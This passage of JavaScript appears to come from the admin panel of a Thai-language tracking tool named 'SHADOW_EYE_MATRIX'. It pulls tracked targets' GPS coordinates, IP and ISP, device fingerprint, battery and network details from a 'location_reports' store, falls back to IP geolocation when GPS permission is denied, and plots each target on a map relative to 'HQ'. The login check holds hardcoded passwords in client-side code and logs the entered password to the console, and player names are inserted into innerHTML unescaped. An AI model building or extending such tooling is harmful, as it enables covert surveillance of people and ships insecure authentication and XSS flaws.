  const cls = { green: 'text-green-400', red: 'text-red-400', orange: 'text-orange-400', white: 'text-white' };
  headerStatus.className = `text-[10px] sm:text-xs ${cls[color] || cls.white}`;
}

function showAppSelector() {
  if (loginScreen) loginScreen.classList.add('hidden');
  if (appSelector) appSelector.classList.remove('hidden');
}

function showDashboard(user, restore = false, role = 'super-admin') {
  // ซ่อนหน้าจอโหลด (Loading Screen) ก่อนแสดง Dashboard
  if (loadingScreen) {
    loadingScreen.classList.add('hidden');
  }

  sessionUser = user;
  userRole = role;
  saveSession({ username: user, role: role });
  captureScreenAnalytics();
  loadPlayers();
  initMonitors();
  initDeviceOrientation();

  // ซ่อนหน้าจอล็อกอินและแสดงหน้า App Selector (ไม่ใช่ Dashboard โดยตรง)
  if (loginScreen) loginScreen.classList.add('hidden');
  if (appSelector) appSelector.classList.remove('hidden');
  if (dashboard) dashboard.classList.add('hidden');
  if (infoSession) infoSession.textContent = user;
  if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
  
  // Update role indicator in header
  if (headerRole) {
    if (role === 'observer') {
      headerRole.textContent = 'Admin Observer';
      headerRole.classList.remove('hidden');
    } else {
      headerRole.classList.add('hidden');
    }
  }
  
  // Update Admin Account Icon
  updateAdminAccountIcon();
  
  setHeaderStatus(typeof navigator.onLine === 'boolean' && navigator.onLine ? 'Ready' : 'Offline',
    navigator.onLine ? 'white' : 'red');
  
  clearConsole();
  appendLog('═══════════════════════════════════════════', LOG.dim);
  appendLog('SHADOW_EYE_MATRIX — Integrated Tactical Mode', LOG.green);
  appendLog('═══════════════════════════════════════════', LOG.dim);
  
  if (role === 'observer') {
    appendLog(`🔍 โหวตเป็นผู้สังเกตการณ์ (Observer Mode) — ${user}`, LOG.orange);
    appendLog('⚠️ คุณสามารถดูข้อมูลได้เท่านั้น ไม่สามารถแก้ไขได้', LOG.red);
  } else {
    appendLog(restore ? `Session restored — Welcome back, ${user}` : `Authenticated — Welcome, ${user}`, LOG.green);
  }
  
  const sa = screenAnalytics;
  appendLog(`Screen: ${sa.resolution} @ ${sa.devicePixelRatio}x DPR (${sa.orientation})`, LOG.orange);
  
  // Log hardware telemetry on dashboard load
  const hw = getHardwareTelemetry();
  appendLog('═══ Advanced Hardware Telemetry ═══', LOG.green);
  appendLog(`Device Type: ${hw.deviceType || '—'}`, LOG.cyan || LOG.white);
  appendLog(`CPU Cores: ${hw.cpuCores ? hw.cpuCores + ' cores' : '—'}`, LOG.white);
  appendLog(`RAM: ${hw.ramGB ? hw.ramGB + ' GB' : '—'}`, LOG.white);
  appendLog(`GPU: ${hw.gpu ? hw.gpu.substring(0, 40) + (hw.gpu.length > 40 ? '...' : '') : '—'}`, LOG.white);
  appendLog(`Posture: ${getPostureThai(hw.posture)}`, LOG.orange);
  
  renderPlayerList();
  printCommandGuide();
  
  setTimeout(() => {
    initMap();
    try { mapInstance?.invalidateSize(); } catch (_) {}
  }, 200);
  
  if (commandInput) commandInput.focus();
}

function showLogin() {
  sessionUser = null;
  userRole = null;
  lastGpsResult = null;
  selectedTarget = 'admin';
  clearSession();
  teardownMonitors();
  stopAllTracking();
  
  destroyMap();
  
  if (dashboard) dashboard.classList.add('hidden');
  if (appSelector) appSelector.classList.add('hidden');
  if (loginScreen) loginScreen.classList.remove('hidden');
  if (loginForm) loginForm.reset();
  if (loginError) loginError.classList.add('hidden');
}

// ===== LOADING SCREEN =====
function showLoading(message = 'Initializing Tactical Systems...') {
  if (loadingScreen) {
    loadingScreen.classList.remove('hidden');
    if (loadingText) loadingText.textContent = message;
    if (loadingBar) loadingBar.style.width = '0%';
  }
}

function hideLoading() {
  if (loadingScreen) {
    loadingScreen.classList.add('hidden');
  }
}

function setLoadingProgress(percent) {
  if (loadingBar) {
    loadingBar.style.width = `${Math.min(100, Math.max(0, percent))}%`;
  }
}

// ===== MOBILE DRAWER FUNCTIONS =====
function initMobileDrawers() {
  // Left Drawer elements
  leftDrawer = $('left-drawer');
  leftDrawerClose = $('left-drawer-close');
  mobileLeftToggle = $('mobile-left-toggle');
  mobileRightToggle = $('mobile-right-toggle');
  
  // Drawer control buttons
  drawerGpsBtn = $('drawer-gps-btn');
  drawerQuickGpsBtn = $('drawer-quick-gps-btn');
  drawerQuickStatusBtn = $('drawer-quick-status-btn');
  drawerQuickBatteryBtn = $('drawer-quick-battery-btn');
  drawerQuickNetworkBtn = $('drawer-quick-network-btn');
  drawerQuickClearBtn = $('drawer-quick-clear-btn');
  drawerBackToMenuBtn = $('drawer-back-to-menu-btn');
  
  // Drawer info elements
  drawerInfoSession = $('drawer-info-session');
  drawerInfoActiveTarget = $('drawer-info-active-target');
  drawerInfoGps = $('drawer-info-gps');
  drawerInfoLastAction = $('drawer-info-last-action');
  
  // Mobile toggle buttons
  mobileLeftToggle?.addEventListener('click', openLeftDrawer);
  mobileRightToggle?.addEventListener('click', () => {
    if (selectedTarget && selectedTarget !== 'admin') {
      openRightDrawer(selectedTarget);
    } else {
      // Open with first player or show message
      if (players.length > 0) {
        openRightDrawer(players[0].id);
      }
    }
  });
  
  // Left drawer close button
  leftDrawerClose?.addEventListener('click', closeLeftDrawer);
  
  // Drawer control buttons
  drawerGpsBtn?.addEventListener('click', () => {
    selectedTarget = 'admin';
    if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
    closeLeftDrawer();
    appendLog('[Mobile Drawer] Admin GPS scan initiated', LOG.orange);
    runHybridGeolocation('Admin');
  });
  
  drawerQuickGpsBtn?.addEventListener('click', () => {
    selectedTarget = 'admin';
    if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
    closeLeftDrawer();
    runHybridGeolocation('Admin');
  });
  
  drawerQuickStatusBtn?.addEventListener('click', () => {
    closeLeftDrawer();
    handleCommand('/status');
  });
  
  drawerQuickBatteryBtn?.addEventListener('click', () => {
    closeLeftDrawer();
    handleCommand('/battery');
  });
  
  drawerQuickNetworkBtn?.addEventListener('click', () => {
    closeLeftDrawer();
    handleCommand('/network');
  });
  
  drawerQuickClearBtn?.addEventListener('click', () => {
    closeLeftDrawer();
    handleCommand('/clear');
  });
  
drawerBackToMenuBtn?.addEventListener('click', () => {
    showLoading('กลับสู่เมนูหน้าแรก...');
    setTimeout(() => {
      showAppSelector();
      hideLoading();
    }, 500);
  });
}

function openLeftDrawer() {
  if (leftDrawer) {
    leftDrawer.classList.remove('hidden');
    leftDrawer.style.transform = 'translateX(0)';
    // Update drawer info
    if (drawerInfoSession) drawerInfoSession.textContent = sessionUser || '—';
    if (drawerInfoActiveTarget) drawerInfoActiveTarget.textContent = selectedTarget === 'admin' ? 'Admin' : getPlayer(selectedTarget)?.name || selectedTarget;
    if (drawerInfoGps) drawerInfoGps.textContent = infoGps?.textContent || 'Idle';
    if (drawerInfoLastAction) drawerInfoLastAction.textContent = infoLastAction?.textContent || '—';
  }
}

function closeLeftDrawer() {
  if (leftDrawer) {
    leftDrawer.style.transform = 'translateX(-100%)';
    setTimeout(() => {
      leftDrawer.classList.add('hidden');
    }, 300);
  }
}

// ===== QUICK ACTION BUTTONS =====
function initQuickActionButtons() {
  quickGpsBtn = $('quick-gps-btn');
  quickStatusBtn = $('quick-status-btn');
  quickBatteryBtn = $('quick-battery-btn');
  quickNetworkBtn = $('quick-network-btn');
  quickClearBtn = $('quick-clear-btn');
  backToMenuBtn = $('back-to-menu-btn');
  
  quickGpsBtn?.addEventListener('click', () => {
    selectedTarget = 'admin';
    if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
    appendLog('[Quick Action] Admin GPS scan initiated', LOG.orange);
    runHybridGeolocation('Admin');
  });
  
  quickStatusBtn?.addEventListener('click', () => {
    handleCommand('/status');
  });
  
  quickBatteryBtn?.addEventListener('click', () => {
    handleCommand('/battery');
  });
  
  quickNetworkBtn?.addEventListener('click', () => {
    handleCommand('/network');
  });
  
  quickClearBtn?.addEventListener('click', () => {
    handleCommand('/clear');
  });
  
backToMenuBtn?.addEventListener('click', () => {
    showLoading('กลับสู่เมนูหน้าแรก...');
    setTimeout(() => {
      showAppSelector();
      hideLoading();
    }, 500);
  });
}

// ===== ADMIN OBSERVER HELPER FUNCTIONS =====
async function getClientIP() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    if (res.ok) {
      const data = await res.json();
      return data.ip || null;
    }
  } catch (_) {}
  return null;
}

function getAdminObserverName() {
  try {
    const ips = JSON.parse(localStorage.getItem(ADMIN_OBSERVER_KEY) || '{}');
    const keys = Object.keys(ips);
    const nextNum = (keys.length % 99) + 1;
    return `Admin${String(nextNum).padStart(2, '0')}`;
  } catch (_) {
    return 'Admin01';
  }
}

function saveAdminObserverIP(ip) {
  try {
    const ips = JSON.parse(localStorage.getItem(ADMIN_OBSERVER_KEY) || '{}');
    ips[ip] = { lastLogin: new Date().toISOString() };
    localStorage.setItem(ADMIN_OBSERVER_KEY, JSON.stringify(ips));
  } catch (_) {}
}

function isObserver() {
  return userRole === 'observer';
}

function isSuperAdmin() {
  return userRole === 'super-admin';
}

function showObserverWarning() {
  appendLog('⚠️ คุณไม่มีสิทธิ์ในการแก้ไขข้อมูล (สิทธิ์อ่านอย่างเดียว)', LOG.red);
}

// ===== EVENT BINDING =====
function bindEvents() {
  loginForm?.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // Debug: แสดงค่าที่ระบบอ่านได้
    console.log("=== LOGIN DEBUG ===");
    console.log("Entered Username:", $('username')?.value?.trim());
    console.log("Entered Password:", $('password')?.value);
    console.log("====================");
    
    const usernameInput = $('username');
    const passwordInput = $('password');
    const user = usernameInput.value.trim();
    const pass = passwordInput.value.trim();

    if (user === 'admin' && pass === 'napxper') {
        userRole = 'super-admin';
        saveSession({ username: user, role: userRole });
        showLoading('กำลังเข้าสู่ระบบ...');
        setTimeout(() => {
          showDashboard(user, false, 'super-admin');
          hideLoading();
        }, 500);
    } else if (user === 'admin' && pass === 'lit') {
        userRole = 'observer';
        const clientIP = await getClientIP();
        const observerName = getAdminObserverName();
        saveAdminObserverIP(clientIP);
        saveSession({ username: observerName, role: userRole });
        showLoading('กำลังเข้าสู่ระบบโหวตเป็นผู้สังเกตการณ์...');
        setTimeout(() => {
          showDashboard(observerName, false, 'observer');
          hideLoading();
        }, 500);
    } else {
        if (loginError) {
            loginError.textContent = "❌ ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง โปรดตรวจสอบอีกครั้ง";
            loginError.classList.remove('hidden');
        }
    }
  });
  
  logoutBtn?.addEventListener('click', () => {
    showLoading('กำลังออกจากระบบ...');
    setTimeout(() => {
      showLogin();
      hideLoading();
    }, 500);
  });
  
  gpsIconBtn?.addEventListener('click', () => {
    if (isObserver()) {
      showObserverWarning();
      return;
    }
    selectedTarget = 'admin';
    if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
    appendLog('[GPS Icon] Admin GPS scan initiated', LOG.orange);
    runHybridGeolocation('Admin');
  });
  
  addPlayerBtn?.addEventListener('click', () => {
    if (isObserver()) {
      showObserverWarning();
      return;
    }
    addPlayer();
  });
  
  commandForm?.addEventListener('submit', (e) => {
    e.preventDefault();
    const v = commandInput?.value || '';
    if (commandInput) commandInput.value = '';
    handleCommand(v);
  });
  
// App Selector - GPS Tool button
  gpsToolBtn?.addEventListener('click', () => {
    showLoading('กำลังโหลดแดชบอร์ด...');
    setTimeout(() => {
      // ซ่อนหน้าเลือกเครื่องมือและเปิดแสดงหน้าแดชบอร์ดแผนที่
      if (appSelector) appSelector.classList.add('hidden');
      if (dashboard) dashboard.classList.remove('hidden');
      if (loadingScreen) loadingScreen.classList.add('hidden');
      // เริ่มต้นแผนที่
      initMap();
      try { mapInstance?.invalidateSize(); } catch (_) {}
      hideLoading();
    }, 800);
  });
  
  // Right Drawer events
  drawerClose?.addEventListener('click', closeRightDrawer);
  drawerSaveNotes?.addEventListener('click', () => {
    if (isObserver()) {
      showObserverWarning();
      return;
    }
    savePlayerNotes();
  });
  
  // Initialize Quick Action Buttons
  initQuickActionButtons();
  
  // Initialize Mobile Drawers
  initMobileDrawers();
  
  window.addEventListener('resize', () => {
    try { mapInstance?.invalidateSize(); } catch (_) {}
  });
}

// ===== MOBILE COORDINATE SYNC =====
let mobileSyncTimer = null;
const MOBILE_SYNC_INTERVAL = 7000; // 7 วินาที

function startMobileSync() {
  if (mobileSyncTimer) clearInterval(mobileSyncTimer);
  mobileSyncTimer = setInterval(() => {
    syncMobileCoordinates();
  }, MOBILE_SYNC_INTERVAL);
}

function stopMobileSync() {
  if (mobileSyncTimer) {
    clearInterval(mobileSyncTimer);
    mobileSyncTimer = null;
  }
}

function syncMobileCoordinates() {
  if (!sessionUser) return;
  
  players.forEach((p) => {
    if (p.tracking && p.coords) {
      // ตรวจสอบการอัปเดตล่าสุดจากมือถือ
      const lastUpdate = p.lastUpdate ? new Date(p.lastUpdate) : null;
      const now = new Date();
      
      // ถ้ามีการอัปเดตใน 10 วินาทีที่ผ่านมา ให้รีเฟรชข้อมูล
      if (lastUpdate && (now - lastUpdate) < 10000) {
        // อัปเดตแผนที่โดยอัตโนมัติ
        if (mapInstance && p.coords) {
          updateMapMarker('player', p.id, p.coords.latitude, p.coords.longitude,
            `<b>${esc(p.name)}</b><br>${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)}<br>${p.distanceKm ? p.distanceKm.toFixed(2) + ' km from HQ' : ''}<br><a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
        }
        // อัปเดต Left Sidebar Activity Log
        updateActivityLog(p.id, '📍 พิกัดอัปเดต', `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}`);
      }
    }
  });
}

// ===== COORDINATE POLLING FOR MOBILE SYNC =====
let lastCoordCheckTime = 0;
let lastCoordData = {};

function checkForNewCoordinates() {
  // เช็คพิกัดใหม่จากฐานข้อมูลจำลอง (localStorage)
  const coordKey = 'mobile_coords_latest';
  const stored = localStorage.getItem(coordKey);
  
  if (!stored) return;
  
  try {
    const data = JSON.parse(stored);
    const checkTime = data.timestamp ? new Date(data.timestamp).getTime() : 0;
    
    // ถ้ามีข้อมูลใหม่ที่ยังไม่ได้ประมวลผล
    if (checkTime > lastCoordCheckTime) {
      lastCoordCheckTime = checkTime;
      
      // ประมวลผลข้อมูลพิกัดใหม่
      if (data.targetId && data.coords) {
        handleRealTimeLocationData(data.targetId, {
          coords: data.coords,
          timestamp: data.timestamp,
          permission: data.permission,
          source: data.source,
          distanceKm: data.distanceKm,
          ipData: data.ipData,
          fingerprint: data.fingerprint,
          battery: data.battery,
          charging: data.charging,
          network: data.network
        });
        
        // แสดงข้อความใน Activity Log Console แบบ Tactical
        pushToActivityLogConsole(data.targetId, {
          coords: data.coords,
          permission: data.permission,
          source: data.source,
          distanceKm: data.distanceKm,
          fingerprint: data.fingerprint,
          battery: data.battery,
          charging: data.charging,
          network: data.network
        });
      }
    }
  } catch (e) {
    // ข้ามข้อผิดพลาด
  }
}

// เริ่มการเช็คพิกัดในลูป
function startCoordinatePolling() {
  if (mobileSyncTimer) clearInterval(mobileSyncTimer);
  mobileSyncTimer = setInterval(() => {
    checkForNewCoordinates();
    syncMobileCoordinates();
  }, MOBILE_SYNC_INTERVAL);
}

function stopCoordinatePolling() {
  if (mobileSyncTimer) {
    clearInterval(mobileSyncTimer);
    mobileSyncTimer = null;
  }
}

// ===== LEFT SIDEBAR ACTIVITY LOG =====
let activityLogEl = null;

function initActivityLog() {
  activityLogEl = $('activity-log');
}

function updateActivityLog(playerId, eventType, data) {
  if (!activityLogEl) return;
  
  const p = getPlayer(playerId);
  const playerName = p ? p.name : playerId;
  const time = new Date().toLocaleTimeString('th-TH', { hour12: false });
  
  const entry = document.createElement('div');
  entry.className = 'activity-entry text-[10px] py-1 border-b border-neutral-800/50 last:border-0';
  entry.innerHTML = `
    <div class="flex items-center gap-1">
      <span class="text-cyan-400">${time}</span>
      <span class="text-green-400">${eventType}</span>
    </div>
    <div class="text-white/80 truncate">${playerName}: ${data}</div>
  `;
  
  activityLogEl.insertBefore(entry, activityLogEl.firstChild);
  
  // เก็บเพียง 50 รายการล่าสุด
  while (activityLogEl.children.length > 50) {
    activityLogEl.removeChild(activityLogEl.lastChild);
  }
}

// ===== ADMIN ACCOUNT ICON =====
function updateAdminAccountIcon() {
  if (!adminAccountIcon || !adminIconSymbol || !adminIconText) return;
  
  if (userRole === 'super-admin') {
    // แสดงไอคอนผู้ดูแลระบบ (Super Admin)
    adminIconSymbol.textContent = '👑';
    adminIconText.textContent = 'Admin: NAPXPER';
    adminAccountIcon.classList.remove('hidden');
    adminAccountIcon.classList.add('flex');
  } else if (userRole === 'observer') {
    // แสดงไอคอนผู้สังเกตการณ์ (Observer)
    adminIconSymbol.textContent = '👁';
    adminIconText.textContent = `Admin Observer (${sessionUser || '—'})`;
    adminAccountIcon.classList.remove('hidden');
    adminAccountIcon.classList.add('flex');
  } else {
    adminAccountIcon.classList.add('hidden');
    adminAccountIcon.classList.remove('flex');
  }
}

// ===== FIREBASE REAL-TIME LISTENER =====
let firebaseUnsubscribe = null;

function initFirebaseListener() {
  // ตรวจสอบว่า Firebase ถูกโหลดและพร้อมใช้งาน
  if (typeof firebase === 'undefined' || !firebase.apps || firebase.apps.length === 0) {
    // พยายามเริ่มต้น Firebase ด้วย config ฐาน
    try {
      if (typeof firebase !== 'undefined' && firebase.initializeApp) {
        firebase.initializeApp({
          projectId: 'shadow-eye-matrix',
        });
      }
    } catch (e) {
      console.warn('Firebase not available, using localStorage fallback');
      return;
    }
  }
  
  // เริ่มฟังข้อมูลจาก Firestore
  if (typeof firebase !== 'undefined' && firebase.firestore) {
    try {
      const db = firebase.firestore();
      firebaseUnsubscribe = db.collection('location_reports').onSnapshot((snapshot) => {
        snapshot.docChanges().forEach((change) => {
          if (change.type === 'added' || change.type === 'modified') {
            const data = change.doc.data();
            const targetId = change.doc.id;
            handleRealTimeLocationData(targetId, data);
          }
        });
      }, (error) => {
        console.warn('Firebase listener error:', error);
        // หาก Firebase ล้มเหลว ให้ใช้ localStorage polling
        startLocalStoragePolling();
      });
    } catch (e) {
      console.warn('Firebase listener setup failed:', e);
      startLocalStoragePolling();
    }
  } else {
    // หาก Firebase ไม่พร้อมใช้งาน ให้ใช้ localStorage polling
    startLocalStoragePolling();
  }
}

function startLocalStoragePolling() {
  // ใช้การตรวจสอบ localStorage เป็นวิธีสำรอง
  // ระบบนี้ทำงานเมื่อ Firebase ไม่พร้อมใช้งาน
  let lastCheckTime = localStorage.getItem('last_location_check') || '0';
  
  setInterval(() => {
    const currentCheck = localStorage.getItem('last_location_check') || '0';
    if (currentCheck !== lastCheckTime) {
      lastCheckTime = currentCheck;
      // ตรวจสอบผู้เล่นที่มีการอัปเดต
      players.forEach((p) => {
        if (p.lastUpdate) {
          const updateTime = new Date(p.lastUpdate).getTime();
          const lastTime = parseInt(lastCheckTime);
          if (updateTime > lastTime) {
            // มีข้อมูลใหม่
            handleRealTimeLocationData(p.id, p);
          }
        }
      });
    }
  }, 3000); // ตรวจสอบทุก 3 วินาที
}

function handleRealTimeLocationData(targetId, data) {
  // ค้นหาผู้เล่นที่ตรงกับ targetId
  const p = getPlayer(targetId);
  if (!p || !data.coords) return;
  
  // อัปเดตข้อมูลผู้เล่น
  p.coords = data.coords;
  p.lastUpdate = data.timestamp || new Date().toISOString();
  p.permission = data.permission;
  p.source = data.source;
  p.distanceKm = data.distanceKm;
  p.ip = data.ipData?.ip || data.ip || null;
  p.isp = data.ipData?.org || data.isp || null;
  p.os = data.fingerprint?.os || data.os || null;
  p.screen = data.fingerprint?.screen || data.screen || null;
  p.lastOnline = data.timestamp || new Date().toISOString();
  p.lastOffline = null;
  
  if (data.battery !== undefined) {
    p.battery = data.battery;
    p.charging = data.charging;
  }
  if (data.network) {
    p.network = data.network;
  }
  
  // Hardware Telemetry
  if (data.fingerprint) {
    p.deviceType = data.fingerprint.deviceType || null;
    p.cpuCores = data.fingerprint.cpuCores || null;
    p.ramGB = data.fingerprint.ramGB || null;
    p.gpu = data.fingerprint.gpu || null;
  }
  
  // เพิ่มเหตุการณ์ลงในไทม์ไลน์
  addTimelineEvent(targetId, 'online', { coords: p.coords });
  
  // บันทึกลง localStorage
  savePlayers();
  
  // อัปเดตแผนที่และเลื่อนศูนย์กลางอัตโนมัติ
  if (mapInstance && p.coords) {
    updateMapMarker('player', targetId, p.coords.latitude, p.coords.longitude,
      `<b>${esc(p.name)}</b><br>${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)}<br>${p.distanceKm ? p.distanceKm.toFixed(2) + ' km from HQ' : ''}<br><a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
    // เลื่อนแผนที่ไปยังพิกัดใหม่โดยอัตโนมัติ
    panMapTo(p.coords.latitude, p.coords.longitude, 14);
  }
  
  // อัปเดตรายการผู้เล่น
  renderPlayerList();
  
  // ส่งข้อความไปยัง Activity Log Console
  pushToActivityLogConsole(targetId, data);
}

function pushToActivityLogConsole(targetId, data) {
  // ฟังก์ชันสำหรับผลักข้อความไปยังกล่องรายงานการทำงานด้านซ้ายมือ
  if (!activityLogEl) return;
  
  const p = getPlayer(targetId);
  const playerName = p ? p.name : targetId;
  const time = new Date().toLocaleTimeString('th-TH', { hour12: false });
  
  // สร้างข้อความรายงานกิจกรรมแบบ Real-time พร้อมภาษาไทยกำกับ
  const permissionText = data.permission === 'Granted' ? '✅ Granted (GPS) [ได้รับอนุญาต GPS]' : '❌ Denied (IP Geo) [ปฏิเสธ - ใช้ IP]';
  const sourceText = data.source ? `${data.source} [${data.source === 'GPS' ? 'พิกัด GPS' : 'พิกัด IP'}]` : '—';
  
  // สร้างรายการข้อมูลแบบละเอียด
  let detailsHtml = '';
  if (data.coords) {
    detailsHtml += `<div class="text-orange-400 ml-4 text-[9px]">📍 Coordinates [พิกัดดาวเทียม]: ${data.coords.latitude.toFixed(6)}, ${data.coords.longitude.toFixed(6)}</div>`;
  }
  if (data.distanceKm != null) {
    detailsHtml += `<div class="text-cyan-400 ml-4 text-[9px]">📏 Distance from HQ [ระยะห่าง]: ${data.distanceKm.toFixed(2)} km</div>`;
  }
  if (data.fingerprint) {
    detailsHtml += `<div class="text-white/60 ml-4 text-[9px]">💻 OS [ระบบปฏิบัติการ]: ${data.fingerprint.os || '—'} | 🌐 Browser [เว็บเบราว์เซอร์]: ${data.fingerprint.browser || '—'}</div>`;
  }
  if (data.battery !== undefined) {
    detailsHtml += `<div class="text-yellow-400 ml-4 text-[9px]">🔋 Battery [แบตเตอรี่]: ${data.battery}%${data.charging ? ' (กำลังชาร์จไฟ)' : ''}</div>`;
  }
  if (data.network) {
    detailsHtml += `<div class="text-blue-400 ml-4 text-[9px]">📶 Network [เครือข่าย]: ${data.network}</div>`;
  }
  
  const entry = document.createElement('div');
  entry.className = 'activity-entry text-[10px] py-1 border-b border-neutral-800/50 last:border-0';
  entry.innerHTML = `
    <div class="flex items-center gap-1">
      <span class="text-cyan-400">${time}</span>
      <span class="text-green-400">📡 รับข้อมูล Real-time [Real-time Location Sync]</span>
    </div>
    <div class="text-white/80 truncate">${playerName}:</div>
    <div class="text-white/80 ml-2">${permissionText} | ${sourceText}</div>
    ${detailsHtml}
  `;
  
  activityLogEl.insertBefore(entry, activityLogEl.firstChild);
  
  // เก็บเพียง 50 รายการล่าสุด
  while (activityLogEl.children.length > 50) {
    activityLogEl.removeChild(activityLogEl.lastChild);
  }
}

// ===== BOOT =====
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', safeInit);
} else {
  safeInit();
}
